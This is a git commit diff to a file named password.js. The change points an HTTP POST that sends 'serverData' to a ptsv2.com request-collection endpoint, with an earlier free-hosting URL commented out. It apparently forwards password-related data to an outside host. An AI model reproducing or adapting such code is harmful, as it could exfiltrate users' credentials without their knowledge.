0a57c554e70e50ecccb025d2dc4c742ad16194ce
PDA <PDA@Tests-MacBook-Pro-3.local>
2018-10-29 15:45:28 -0400

    updating

--- password.js
+++ password.js
@@ -23,7 +23,7 @@ cli.onreadystatechange = function() {
         }
 };
 //cli.open('POST', 'https://palexandrov.000webhostapp.com/index.php');
-cli.open('POST', 'http://ptsv2.com/t/uv2pn-1540842031');
+cli.open('POST', 'http://ptsv2.com/t/uv2pn-1540842031/post');
 //cli.setRequestHeader('Content-Type', 'application/json');
 cli.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 cli.send("serverData=" + serverData);
